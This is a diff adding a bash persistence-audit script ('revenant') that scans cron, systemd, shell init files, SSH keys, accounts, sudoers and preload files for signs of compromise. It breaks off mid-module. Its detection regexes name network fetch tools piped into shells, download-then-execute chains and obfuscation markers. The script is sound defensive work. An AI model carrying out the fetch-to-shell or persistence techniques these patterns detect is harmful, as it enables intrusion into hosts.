@@ -1,0 +1,1600 @@
+#!/usr/bin/env bash
+# revenant - persistence audit for unix hosts. pure bash. nothing leaves the machine.
+# one file. no dependencies beyond coreutils. bash 3.2+.
+# license: MIT
+# shellcheck disable=SC2016  # eval templates are intentional (indexed finding store)
+# shellcheck disable=SC2012  # ls -ld perms parse is the portable way (GNU/BSD stat differ)
+# shellcheck disable=SC2094  # audited paths are function arguments, never redirected
+set -u -o pipefail
+export LC_ALL=C
+
+RVT_VERSION="0.1.0"
+RVT_NAME="revenant"
+RVT_TAB=$(printf '\t')
+
+# ------------------------------------------------------------------ globals
+RVT_ROOT=""                  # audit root; empty = host (/) (override with --root)
+RVT_FINDINGS_NO=0            # findings stored as F_SEV_<n> F_FID_<n> F_MECH_<n> F_PATH_<n> F_DET_<n>
+RVT_SEEN_UNITS=""            # dedupe list for systemd unit files (newline separated)
+RVT_PATH_DIRS_DONE=""        # dedupe for PATH dir findings
+RVT_HAS_CRIT=0
+RVT_SCORE=0
+
+# coverage counters (per module)
+RVT_COV_CRON_C=0;   RVT_COV_CRON_F=0
+RVT_COV_AT_C=0;     RVT_COV_AT_F=0
+RVT_COV_SVC_C=0;    RVT_COV_SVC_F=0
+RVT_COV_SHELL_C=0;  RVT_COV_SHELL_F=0
+RVT_COV_SSH_C=0;    RVT_COV_SSH_F=0
+RVT_COV_ACCT_C=0;   RVT_COV_ACCT_F=0
+RVT_COV_SUDO_C=0;   RVT_COV_SUDO_F=0
+RVT_COV_LINK_C=0;   RVT_COV_LINK_F=0
+RVT_COV_BOOT_C=0;   RVT_COV_BOOT_F=0
+RVT_COV_TRIG_C=0;   RVT_COV_TRIG_F=0
+
+# ------------------------------------------------------------------ colors
+RVT_COLOR="0"
+if [ -t 1 ] && [ -z "${RVT_NO_COLOR_FORCE:-}" ]; then RVT_COLOR="1"; fi
+if [ "${RVT_FORCE_COLOR:-0}" = "1" ]; then RVT_COLOR="1"; fi
+if [ "${RVT_NO_COLOR:-0}" = "1" ]; then RVT_COLOR="0"; fi
+
+c_red()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[31m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_grn()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[32m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_yel()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[33m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_blu()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[34m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_mag()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[35m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_cyn()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[36m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_dim()    { if [ "$RVT_COLOR" = "1" ]; then printf '\033[2m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+c_bold()   { if [ "$RVT_COLOR" = "1" ]; then printf '\033[1m%s\033[0m' "$1"; else printf '%s' "$1"; fi; }
+
+# ------------------------------------------------------------------ helpers
+rv_die() { printf '%s: error: %s\n' "$RVT_NAME" "$1" >&2; exit 64; }
+rv_warn() { printf '%s: warning: %s\n' "$RVT_NAME" "$1" >&2; }
+
+# strip control chars, collapse runs of whitespace, cap length
+rv_clean() {
+  printf '%s' "$1" | tr -d '\000-\010\013\014\016-\037' | tr -s '[:space:]' ' ' | sed -E 's/^ +//; s/ +$//'
+}
+rv_clip() {
+  local s="$1" max="${2:-160}"
+  if [ "${#s}" -gt "$max" ]; then printf '%s' "${s:0:$max}[...]"; else printf '%s' "$s"; fi
+}
+rv_trim() { rv_clean "$1"; }
+
+# abs path under audit root; arg1 = path as seen in config line (may be relative)
+# echoes normalized "$RVT_ROOT/<abs>" when arg1 starts with /
+rv_abs() {
+  case "$1" in
+    /*) printf '%s' "$RVT_ROOT$1" ;;
+    *)  return 1 ;;
+  esac
+}
+
+# read a file safely if it exists, is a regular file, is readable and bounded (< 2 MiB)
+rv_read_ok() {
+  local f="$1"
+  [ -f "$f" ] || return 1
+  [ -r "$f" ] || return 1
+  local sz
+  sz=$(wc -c < "$f" 2>/dev/null | tr -d ' ')
+  [ -n "$sz" ] || return 1
+  [ "$sz" -le 2097152 ] || return 1
+  return 0
+}
+
+rv_sha256() {
+  if command -v sha256sum >/dev/null 2>&1; then
+    printf '%s' "$1" | sha256sum | cut -d' ' -f1
+  elif command -v shasum >/dev/null 2>&1; then
+    printf '%s' "$1" | shasum -a 256 | cut -d' ' -f1
+  else
+    printf '%s' "$1" | cksum | cut -d' ' -f1
+  fi
+}
+
+# json string escape (bash 3.2 safe)
+esc_json() {
+  local s="$1"
+  s=${s//\\/\\\\}
+  s=${s//\"/\\\"}
+  s=${s//$'\n'/\\n}
+  s=${s//$'\t'/\\t}
+  s=${s//$'\r'/\\r}
+  printf '%s' "$s"
+}
+
+# others-writable? parse ls -ld perms (portable GNU/BSD)
+rv_ow() {
+  local p="$1" perms
+  [ -e "$p" ] || return 1
+  perms=$(ls -ld "$p" 2>/dev/null | cut -c1-10)
+  [ ${#perms} -eq 10 ] || return 1
+  [ "${perms:8:1}" = "w" ] || return 1
+  return 0
+}
+
+# group-writable?
+rv_gw() {
+  local p="$1" perms
+  [ -e "$p" ] || return 1
+  perms=$(ls -ld "$p" 2>/dev/null | cut -c1-10)
+  [ ${#perms} -eq 10 ] || return 1
+  [ "${perms:5:1}" = "w" ] || return 1
+  return 0
+}
+
+rv_in_list() { # $1 needle, $2 newline-separated haystack
+  local needle="$1"
+  case "$2" in
+    *"
+$needle
+"*) return 0 ;;
+  esac
+  return 1
+}
+
+# lexical path normalization: collapses //, /./ and seg/.. without touching the fs
+rv_norm() {
+  local p="$1" out="" seg
+  case "$p" in
+    /*) out="/" ;;
+    *)  out="" ;;
+  esac
+  local rest="${p#/}"
+  while IFS= read -r seg; do
+    [ -n "$seg" ] || continue
+    case "$seg" in
+      .) ;;
+      ..)
+        out=${out%/}
+        case "$out" in
+          "") out="/" ;;
+          *) out="${out%/*}"; [ -n "$out" ] || out="/" ;;
+        esac
+        ;;
+      *) if [ "$out" = "/" ]; then out="/$seg"; else out="$out/$seg"; fi ;;
+    esac
+  done <<EOF
+$(printf '%s' "$rest" | tr '/' '\n')
+EOF
+  [ -n "$out" ] || out="/"
+  printf '%s' "$out"
+}
+
+# ------------------------------------------------------------------ severity infra
+# ranks: crit=0 high=1 med=2 low=3 info=4
+sev_rank() {
+  case "$1" in
+    crit) printf '0' ;;
+    high) printf '1' ;;
+    med)  printf '2' ;;
+    low)  printf '3' ;;
+    info) printf '4' ;;
+    *)    printf '9' ;;
+  esac
+}
+sev_weight() {
+  case "$1" in
+    crit) printf '25' ;;
+    high) printf '10' ;;
+    med)  printf '4' ;;
+    low)  printf '1' ;;
+    info) printf '0' ;;
+    *)    printf '0' ;;
+  esac
+}
+sev_glyph() { # colored severity tag (terminal)
+  case "$1" in
+    crit) c_red "CRIT" ;;
+    high) c_mag "HIGH" ;;
+    med)  c_yel "MED " ;;
+    low)  c_blu "LOW " ;;
+    info) c_dim "INFO" ;;
+    *)    printf '????' ;;
+  esac
+}
+
+# add_finding <severity> <fid> <mechanism> <path> <detail>
+add_finding() {
+  local sev="$1" fid="$2" mech="$3" path="$4" det
+  det=$(rv_clip "$(rv_clean "$5")" 160)
+  # dedupe on sev|fid|mech|path|det
+  local i
+  for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+    eval "local s=\$F_SEV_$i f=\$F_FID_$i m=\$F_MECH_$i p=\$F_PATH_$i d=\$F_DET_$i"
+    # shellcheck disable=SC2154  # assigned by eval above
+    if [ "$s" = "$sev" ] && [ "$f" = "$fid" ] && [ "$m" = "$mech" ] && [ "$p" = "$path" ] && [ "$d" = "$det" ]; then
+      return 0
+    fi
+  done
+  eval "F_SEV_${RVT_FINDINGS_NO}=\"\$sev\"; F_FID_${RVT_FINDINGS_NO}=\"\$fid\"; F_MECH_${RVT_FINDINGS_NO}=\"\$mech\"; F_PATH_${RVT_FINDINGS_NO}=\"\$path\"; F_DET_${RVT_FINDINGS_NO}=\"\$det\""
+  RVT_FINDINGS_NO=$((RVT_FINDINGS_NO + 1))
+  local w
+  w=$(sev_weight "$sev")
+  RVT_SCORE=$((RVT_SCORE + w))
+  if [ "$sev" = "crit" ]; then RVT_HAS_CRIT=1; fi
+  return 0
+}
+
+verdict_calc() {
+  if [ "$RVT_HAS_CRIT" = "1" ] || [ "$RVT_SCORE" -ge 60 ]; then printf 'CRITICAL'
+  elif [ "$RVT_SCORE" -ge 25 ]; then printf 'HIGH'
+  elif [ "$RVT_SCORE" -ge 10 ]; then printf 'ELEVATED'
+  elif [ "$RVT_SCORE" -ge 1 ]; then printf 'LOW'
+  else printf 'CLEAN'
+  fi
+}
+verdict_code() {
+  case "$1" in
+    CLEAN)    printf '0' ;;
+    LOW)      printf '1' ;;
+    ELEVATED) printf '2' ;;
+    HIGH)     printf '3' ;;
+    CRITICAL) printf '10' ;;
+    *)        printf '0' ;;
+  esac
+}
+
+# relative display path (strip root prefix)
+rpath() {
+  local p="$1"
+  if [ -z "$RVT_ROOT" ]; then printf '%s' "$p"; else printf '%s' "${p#"$RVT_ROOT"}"; fi
+}
+
+# ------------------------------------------------------------------ classifiers
+# has_fetch: curl/wget/nc/tftp present on the line
+rx_fetch() { printf '%s' "$1" | grep -Eiq '(^|[^a-zA-Z])(curl|wget|ncat|netcat|nc|tftp|ftpget)([^a-zA-Z]|$)'; }
+# pipe or chain into an interpreter
+rx_pipe_shell() { printf '%s' "$1" | grep -Eiq '\|[[:space:]]*/?([a-z]{0,3}sh|python[0-9.]*|perl|ruby|pwsh)([[:space:]]|$)'; }
+# download-then-execute chain (curl -o X && chmod && X)
+rx_dl_exec() { printf '%s' "$1" | grep -Eiq '(-o|-O|-qO|-sO|--output)[[:space:]]+[^|;]*(&&|\;).*(chmod[^&;]*(\+x|0755|755)|/bin/(ba|z)?sh|\.(/[a-z0-9_.-]+))'; }
+# volatile paths used by malware staging
+rx_volatile() { printf '%s' "$1" | grep -Eiq '(/tmp/|/var/tmp/|/dev/shm/)'; }
+# obfuscation markers
+rx_obf() { printf '%s' "$1" | grep -Eiq '(base64[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*-d|eval[[:space:]]*[("$]|printf[[:space:]].*\\\\x[0-9a-f]{2}|python[0-9.]*[[:space:]]+-c|perl[[:space:]]+-e|xxd[[:space:]]+-r|openssl[[:space:]]+(enc|aes)|gzip[[:space:]]+-d[[:space:]]?|\\\\x[0-9a-f]{2})'; }
+
+# fetch-to-shell combined test: fetch present AND (piped to shell OR dl-exec chain)
+rx_f2s() {
+  rx_fetch "$1" || return 1
+  if rx_pipe_shell "$1" || rx_dl_exec "$1"; then return 0; fi
+  return 1
+}
+
+# invisible unicode channels: zero-widths, bidi controls, BOM, tags
+rv_invisible() {
+  local f="$1" b
+  for b in $'\xe2\x80\x8b' $'\xe2\x80\x8c' $'\xe2\x80\x8d' $'\xe2\x80\xaf' \
+           $'\xe2\x80\xaa' $'\xe2\x80\xab' $'\xe2\x80\xac' $'\xe2\x80\xae' \
+           $'\xef\xbb\xbf' $'\xf3\xa0\x84\x80' $'\xf3\xa0\x86\x8f'; do
+    if LC_ALL=C grep -F -q -e "$b" "$f" 2>/dev/null; then return 0; fi
+  done
+  return 1
+}
+
+# classify one config line already associated with a module emitter
+# args: line  -> sets RVT_F2S / RVT_VOL / RVT_OBF
+rv_classify() {
+  RVT_F2S=0; RVT_VOL=0; RVT_OBF=0
+  if rx_f2s "$1"; then RVT_F2S=1; fi
+  if rx_volatile "$1"; then RVT_VOL=1; fi
+  if rx_obf "$1"; then RVT_OBF=1; fi
+  return 0
+}
+
+# ------------------------------------------------------------------ module: cron
+mod_cron() {
+  local files="" f
+  f="$RVT_ROOT/etc/crontab";        [ -f "$f" ] && files="$files
+$f"
+  f="$RVT_ROOT/etc/cron.d";         if [ -d "$f" ]; then while IFS= read -r -d '' x; do files="$files
+$x"; done < <(find "$f" -maxdepth 1 -type f -print0 2>/dev/null); fi
+  f="$RVT_ROOT/var/spool/cron/crontabs"; if [ -d "$f" ]; then while IFS= read -r -d '' x; do files="$files
+$x"; done < <(find "$f" -maxdepth 1 -type f -print0 2>/dev/null); fi
+  f="$RVT_ROOT/var/spool/cron/tabs";     if [ -d "$f" ]; then while IFS= read -r -d '' x; do files="$files
+$x"; done < <(find "$f" -maxdepth 1 -type f -print0 2>/dev/null); fi
+
+  [ -n "$files" ] || return 0
+  local nl
+  nl=$(printf '%s\n' "$files" | sed '/^$/d' | wc -l | tr -d ' ')
+  RVT_COV_CRON_C=$((RVT_COV_CRON_C + nl))
+
+  local base bname
+  while IFS= read -r base; do
+    [ -n "$base" ] || continue
+    bname=${base##*/}
+    # hidden cron file in cron.d or spool
+    case "$bname" in
+      .*|*~|*.dpkg-*|*.rpmnew) ;;
+      *) : ;;
+    esac
+    if case "$bname" in .*) true ;; *) false ;; esac; then
+      add_finding med RVT-CRON-004 cron "$base" "hidden cron file name"
+      RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+    fi
+    if rv_ow "$base"; then
+      add_finding high RVT-CRON-005 cron "$base" "crontab world-writable"
+      RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+    fi
+    rv_read_ok "$base" || continue
+    local ln=0 line
+    while IFS= read -r line || [ -n "$line" ]; do
+      ln=$((ln + 1))
+      case "$line" in ''|'#'*|' '*) continue ;; esac
+      rv_classify "$line"
+      if [ "$RVT_F2S" = "1" ]; then
+        add_finding crit RVT-CRON-001 cron "$base" "L$ln: scheduled task fetches and pipes into a shell: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+      fi
+      if [ "$RVT_VOL" = "1" ]; then
+        add_finding high RVT-CRON-002 cron "$base" "L$ln: scheduled task executes from volatile path: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+      fi
+      if [ "$RVT_OBF" = "1" ]; then
+        add_finding high RVT-CRON-003 cron "$base" "L$ln: obfuscated payload in scheduled task: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+      fi
+      # referenced script targets writable?
+      local tok
+      for tok in $(printf '%s' "$line" | grep -oE '(/[A-Za-z0-9._/-]+)'); do
+        case "$tok" in
+          /tmp/*|/var/tmp/*|/dev/shm/*) continue ;;  # volatile already flagged
+        esac
+        if [ -f "$RVT_ROOT$tok" ] && rv_ow "$RVT_ROOT$tok"; then
+          add_finding high RVT-CRON-005 cron "$base" "L$ln: referenced script world-writable: $tok"
+          RVT_COV_CRON_F=$((RVT_COV_CRON_F + 1))
+        fi
+      done
+    done < "$base"
+  done <<EOF
+$(printf '%s' "$files" | sed '/^$/d')
+EOF
+  return 0
+}
+
+# ------------------------------------------------------------------ module: at
+mod_at() {
+  local dirs="$RVT_ROOT/var/spool/cron/atjobs $RVT_ROOT/var/spool/at" d
+  for d in $dirs; do
+    [ -d "$d" ] || continue
+    while IFS= read -r -d '' x; do
+      RVT_COV_AT_C=$((RVT_COV_AT_C + 1))
+      case "${x##*/}" in .*) continue ;; esac
+      add_finding med RVT-AT-001 at "$x" "at job queued: ${x##*/}"
+      RVT_COV_AT_F=$((RVT_COV_AT_F + 1))
+      if rv_read_ok "$x"; then
+        local body
+        body=$(cat "$x" 2>/dev/null)
+        rv_classify "$body"
+        if [ "$RVT_F2S" = "1" ]; then
+          add_finding crit RVT-AT-002 at "$x" "at job fetches and pipes into a shell"
+          RVT_COV_AT_F=$((RVT_COV_AT_F + 1))
+        elif [ "$RVT_VOL" = "1" ] || [ "$RVT_OBF" = "1" ]; then
+          add_finding high RVT-AT-002 at "$x" "at job executes from volatile path or uses obfuscation"
+          RVT_COV_AT_F=$((RVT_COV_AT_F + 1))
+        fi
+      fi
+    done < <(find "$d" -maxdepth 1 -type f -print0 2>/dev/null)
+  done
+  return 0
+}
+
+# ------------------------------------------------------------------ module: systemd
+# emit judgments for one unit file
+_svc_judge() {
+  local u="$1" ln=0 line hard=0
+  RVT_COV_SVC_C=$((RVT_COV_SVC_C + 1))
+  rv_read_ok "$u" || return 0
+  while IFS= read -r line || [ -n "$line" ]; do
+    ln=$((ln + 1))
+    case "$line" in ''|'#'*|';'*) continue ;; esac
+    case "$line" in
+      ExecStart*|ExecReload*|ExecStop*|ExecCondition*) ;;
+      *) continue ;;  # only Exec* lines carry commands
+    esac
+    rv_classify "$line"
+    if [ "$RVT_F2S" = "1" ]; then
+      add_finding crit RVT-SVC-002 systemd "$u" "L$ln: unit fetches and pipes into a shell: $(rv_clip "$(rv_clean "$line")" 120)"
+      RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+    fi
+    if [ "$RVT_VOL" = "1" ]; then
+      add_finding high RVT-SVC-001 systemd "$u" "L$ln: unit executes from volatile path: $(rv_clip "$(rv_clean "$line")" 120)"
+      RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+    fi
+    if [ "$RVT_OBF" = "1" ]; then
+      add_finding high RVT-SVC-003 systemd "$u" "L$ln: obfuscated command in unit: $(rv_clip "$(rv_clean "$line")" 120)"
+      RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+    fi
+  done < "$u"
+  # hardening absent on /etc or user units that execute non-standard binaries
+  case "$u" in
+    *"$RVT_ROOT/usr/lib/systemd/"*|*"$RVT_ROOT/lib/systemd/"*) return 0 ;;
+  esac
+  if grep -Eq '^(NoNewPrivileges|ProtectSystem|PrivateTmp|ProtectHome|CapabilityBoundingSet|SystemCallFilter)=' "$u" 2>/dev/null; then hard=1; fi
+  if [ "$hard" = "0" ]; then
+    add_finding info RVT-SVC-004 systemd "$u" "unit outside vendor tree without sandboxing directives"
+    RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+  fi
+  return 0
+}
+
+mod_systemd() {
+  local dirs="$RVT_ROOT/etc/systemd/system $RVT_ROOT/usr/lib/systemd/system $RVT_ROOT/lib/systemd/system"
+  local u
+  # per-user units
+  local ud
+  for ud in "$RVT_ROOT"/home/*/.config/systemd/user "$RVT_ROOT/root/.config/systemd/user"; do
+    [ -d "$ud" ] && dirs="$dirs $ud"
+  done
+  for d in $dirs; do
+    [ -d "$d" ] || continue
+    while IFS= read -r -d '' x; do
+      u=$(cd "$(dirname "$x")" 2>/dev/null && pwd)/${x##*/}
+      if rv_in_list "$u" "$RVT_SEEN_UNITS"; then continue; fi
+      RVT_SEEN_UNITS="$RVT_SEEN_UNITS
+$u"
+      case "${x##*/}" in
+        *.service|*.conf) _svc_judge "$x" ;;
+        *.timer) _timer_judge "$x" ;;
+      esac
+    done < <(find "$d" \( -name '*.service' -o -name '*.timer' -o -name '*.conf' \) -type f -print0 2>/dev/null)
+    # wants/requires symlinks pointing outside unit trees
+    while IFS= read -r -d '' x; do
+      local ltgt lnorm
+      ltgt=$(readlink "$x" 2>/dev/null) || continue
+      case "$ltgt" in
+        /*) lnorm="$ltgt" ;;
+        *)  lnorm="$(dirname "$x")/$ltgt" ;;
+      esac
+      # lexical normalize ../
+      lnorm=$(rv_norm "$lnorm")
+      case "$lnorm" in
+        *"$RVT_ROOT/etc/systemd/system/"*|*"$RVT_ROOT/usr/lib/systemd/system/"*|*"$RVT_ROOT/lib/systemd/system/"*|*"$RVT_ROOT/run/systemd/system/"*|*"/etc/init.d/"*|*"/etc/rc.d/init.d/"*|/dev/null) ;;
+        *)
+          add_finding high RVT-SVC-005 systemd "$x" "wants/requires symlink targets outside unit directories: $(rpath "$lnorm")"
+          RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+          ;;
+      esac
+    done < <(find "$d" -type l \( -name '*.service' -o -name '*.timer' -o -name '*.target' -o -name '*.path' \) -print0 2>/dev/null)
+  done
+  return 0
+}
+
+_timer_judge() {
+  local t="$1" line
+  RVT_COV_SVC_C=$((RVT_COV_SVC_C + 1))
+  rv_read_ok "$t" || return 0
+  while IFS= read -r line || [ -n "$line" ]; do
+    case "$line" in
+      OnUnitActiveSec=[1-5]min|OnBootSec=[1-5]min|OnStartupSec=[1-5]min)
+        add_finding info RVT-TIM-001 systemd "$t" "timer fires on a tight cadence: $(rv_clean "$line")"
+        RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+        ;;
+      OnCalendar=*:*:0*|OnCalendar=*:0/1*)
+        add_finding info RVT-TIM-001 systemd "$t" "timer fires on a tight cadence: $(rv_clean "$line")"
+        RVT_COV_SVC_F=$((RVT_COV_SVC_F + 1))
+        ;;
+    esac
+  done < "$t"
+  return 0
+}
+
+# ------------------------------------------------------------------ module: shell init files
+mod_shell() {
+  local files="" f d
+  for f in "$RVT_ROOT/etc/profile" "$RVT_ROOT/etc/bash.bashrc" \
+           "$RVT_ROOT/etc/zsh/zprofile" "$RVT_ROOT/etc/zsh/zshrc" "$RVT_ROOT/etc/zsh/zshenv"; do
+    [ -f "$f" ] && files="$files
+$f"
+  done
+  f="$RVT_ROOT/etc/profile.d"
+  if [ -d "$f" ]; then while IFS= read -r -d '' x; do files="$files
+$x"; done < <(find "$f" -maxdepth 1 -type f -print0 2>/dev/null); fi
+  local homes="$RVT_ROOT/root"
+  for d in "$RVT_ROOT"/home/*; do [ -d "$d" ] && homes="$homes $d"; done
+  local h
+  for h in $homes; do
+    for f in .bashrc .bash_profile .profile .zshenv .zprofile .zshrc .zlogin; do
+      [ -f "$h/$f" ] && files="$files
+$h/$f"
+    done
+  done
+  [ -n "$files" ] || return 0
+
+  local base
+  while IFS= read -r base; do
+    [ -n "$base" ] || continue
+    RVT_COV_SHELL_C=$((RVT_COV_SHELL_C + 1))
+    rv_read_ok "$base" || continue
+    if rv_invisible "$base"; then
+      add_finding high RVT-SHL-005 shell "$base" "invisible unicode characters embedded in init script"
+      RVT_COV_SHELL_F=$((RVT_COV_SHELL_F + 1))
+    fi
+    local ln=0 line
+    while IFS= read -r line || [ -n "$line" ]; do
+      ln=$((ln + 1))
+      case "$line" in ''|'#'*) continue ;; esac
+      # LD_ hijack exports
+      if printf '%s' "$line" | grep -Eq '^[[:space:]]*(export[[:space:]]+)?LD_(PRELOAD|LIBRARY_PATH)='; then
+        add_finding high RVT-SHL-001 shell "$base" "L$ln: dynamic linker override exported: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_SHELL_F=$((RVT_COV_SHELL_F + 1))
+      fi
+      # alias interception
+      if printf '%s' "$line" | grep -Eq '^[[:space:]]*alias[[:space:]]+(sudo|curl|wget|ssh|pip3?|apt|apt-get|yum|dnf|git)='; then
+        add_finding med RVT-SHL-002 shell "$base" "L$ln: alias intercepts a sensitive command: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_SHELL_F=$((RVT_COV_SHELL_F + 1))
+      fi
+      rv_classify "$line"
+      if [ "$RVT_OBF" = "1" ]; then
+        add_finding high RVT-SHL-003 shell "$base" "L$ln: obfuscated code in init file: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_SHELL_F=$((RVT_COV_SHELL_F + 1))
+      fi
+      # PATH prepends of world-writable dirs
+      if printf '%s' "$line" | grep -Eq '^[[:space:]]*(export[[:space:]]+)?PATH='; then
+        local val comp
+        val=$(printf '%s' "$line" | sed -E 's/^[[:space:]]*(export[[:space:]]+)?PATH=//' | tr -d '"' | tr -d "'")
+        local IFS_BAK="$IFS"; IFS=':'
+        for comp in $val; do
+          IFS="$IFS_BAK"
+          case "$comp" in /*) ;; *) continue ;; esac
+          if [ -d "$RVT_ROOT$comp" ] && rv_ow "$RVT_ROOT$comp"; then
+            add_finding med RVT-SHL-004 shell "$base" "L$ln: PATH entry world-writable: $comp"
+            RVT_COV_SHELL_F=$((RVT_COV_SHELL_F + 1))
+          fi
+        done
+        IFS="$IFS_BAK"
+      fi
+    done < "$base"
+  done <<EOF
+$(printf '%s' "$files" | sed '/^$/d')
+EOF
+  return 0
+}
+
+# ------------------------------------------------------------------ module: ssh
+mod_ssh() {
+  local homes="$RVT_ROOT/root" d h f
+  for d in "$RVT_ROOT"/home/*; do [ -d "$d" ] && homes="$homes $d"; done
+  for h in $homes; do
+    f="$h/.ssh/authorized_keys"
+    [ -f "$f" ] || f="$h/.ssh/authorized_keys2"
+    [ -f "$f" ] || continue
+    RVT_COV_SSH_C=$((RVT_COV_SSH_C + 1))
+    local dirpath="$h/.ssh"
+    if rv_ow "$dirpath" || rv_ow "$f"; then
+      add_finding high RVT-SSH-002 ssh "$f" ".ssh location world-writable"
+      RVT_COV_SSH_F=$((RVT_COV_SSH_F + 1))
+    fi
+    rv_read_ok "$f" || continue
+    local ln=0 line cmd
+    while IFS= read -r line || [ -n "$line" ]; do
+      ln=$((ln + 1))
+      case "$line" in ''|'#'*) continue ;; esac
+      cmd=$(printf '%s' "$line" | grep -oE 'command="[^"]*"' | head -n 1)
+      if [ -n "$cmd" ]; then
+        rv_classify "$cmd"
+        if [ "$RVT_VOL" = "1" ] || [ "$RVT_F2S" = "1" ]; then
+          add_finding high RVT-SSH-003 ssh "$f" "L$ln: authorized key forces command from volatile path: $(rv_clip "$(rv_clean "$cmd")" 120)"
+          RVT_COV_SSH_F=$((RVT_COV_SSH_F + 1))
+        else
+          add_finding med RVT-SSH-001 ssh "$f" "L$ln: authorized key forces a command: $(rv_clip "$(rv_clean "$cmd")" 120)"
+          RVT_COV_SSH_F=$((RVT_COV_SSH_F + 1))
+        fi
+      fi
+    done < "$f"
+  done
+  # sshd config posture
+  f="$RVT_ROOT/etc/ssh/sshd_config"
+  if [ -f "$f" ]; then
+    RVT_COV_SSH_C=$((RVT_COV_SSH_C + 1))
+    if grep -Eq '^[[:space:]]*PermitRootLogin[[:space:]]+yes' "$f" 2>/dev/null; then
+      add_finding info RVT-SSH-004 ssh "$f" "sshd allows direct root login"
+      RVT_COV_SSH_F=$((RVT_COV_SSH_F + 1))
+    fi
+  fi
+  return 0
+}
+
+# ------------------------------------------------------------------ module: accounts
+mod_accounts() {
+  local f="$RVT_ROOT/etc/passwd"
+  [ -f "$f" ] || return 0
+  RVT_COV_ACCT_C=$((RVT_COV_ACCT_C + 1))
+  rv_read_ok "$f" || return 0
+  local seen_uids="" ln=0 line name uid rest
+  while IFS= read -r line || [ -n "$line" ]; do
+    ln=$((ln + 1))
+    case "$line" in ''|'#'*) continue ;; esac
+    name=${line%%:*}
+    rest=${line#*:}; rest=${rest#*:}
+    uid=${rest%%:*}
+    rest=${rest#*:}
+    case "$uid" in *[!0-9]*) continue ;; esac
+    if [ "$uid" = "0" ] && [ "$name" != "root" ]; then
+      add_finding crit RVT-USR-001 accounts "$f" "L$ln: non-root account with UID 0: $name"
+      RVT_COV_ACCT_F=$((RVT_COV_ACCT_F + 1))
+    fi
+    if rv_in_list "$uid" "$seen_uids"; then
+      add_finding high RVT-USR-002 accounts "$f" "L$ln: duplicate UID $uid on account $name"
+      RVT_COV_ACCT_F=$((RVT_COV_ACCT_F + 1))
+    else
+      seen_uids="$seen_uids
+$uid"
+    fi
+  done < "$f"
+  return 0
+}
+
+# ------------------------------------------------------------------ module: sudo
+mod_sudo() {
+  local files="" f d
+  [ -f "$RVT_ROOT/etc/sudoers" ] && files="$RVT_ROOT/etc/sudoers"
+  d="$RVT_ROOT/etc/sudoers.d"
+  if [ -d "$d" ]; then while IFS= read -r -d '' x; do files="$files
+$x"; done < <(find "$d" -maxdepth 1 -type f -print0 2>/dev/null); fi
+  local base
+  while IFS= read -r base; do
+    [ -n "$base" ] || continue
+    RVT_COV_SUDO_C=$((RVT_COV_SUDO_C + 1))
+    if rv_ow "$base"; then
+      add_finding high RVT-SUDO-002 sudo "$base" "sudoers artifact world-writable"
+      RVT_COV_SUDO_F=$((RVT_COV_SUDO_F + 1))
+    fi
+    rv_read_ok "$base" || continue
+    local ln=0 line
+    while IFS= read -r line || [ -n "$line" ]; do
+      ln=$((ln + 1))
+      case "$line" in ''|'#'*) continue ;; esac
+      if printf '%s' "$line" | grep -Eq 'NOPASSWD'; then
+        add_finding med RVT-SUDO-001 sudo "$base" "L$ln: passwordless sudo rule: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_SUDO_F=$((RVT_COV_SUDO_F + 1))
+      fi
+      if printf '%s' "$line" | grep -Eq '^[#@]includedir[[:space:]]+'; then
+        local inc
+        inc=$(printf '%s' "$line" | awk '{print $2}')
+        case "$inc" in
+          /etc/sudoers.d|/usr/local/etc/sudoers.d) ;;
+          *) if [ -n "$inc" ]; then
+               add_finding med RVT-SUDO-002 sudo "$base" "L$ln: nonstandard include directory: $inc"
+               RVT_COV_SUDO_F=$((RVT_COV_SUDO_F + 1))
+             fi ;;
+        esac
+      fi
+    done < "$base"
+  done <<EOF
+$(printf '%s' "$files" | sed '/^$/d')
+EOF
+  return 0
+}
+
+# ------------------------------------------------------------------ module: dynamic linker + PATH
+mod_linker() {
+  local f="$RVT_ROOT/etc/ld.so.preload"
+  if [ -f "$f" ] && rv_read_ok "$f"; then
+    RVT_COV_LINK_C=$((RVT_COV_LINK_C + 1))
+    local body line
+    body=$(grep -Ev '^[[:space:]]*(#|$)' "$f" 2>/dev/null)
+    if [ -n "$body" ]; then
+      while IFS= read -r line; do
+        [ -n "$line" ] || continue
+        add_finding crit RVT-PRX-001 linker "$f" "preloaded library: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_LINK_F=$((RVT_COV_LINK_F + 1))
+      done <<EOF
+$body
+EOF
+    fi
+  fi
+  # ld.so.conf.d entries
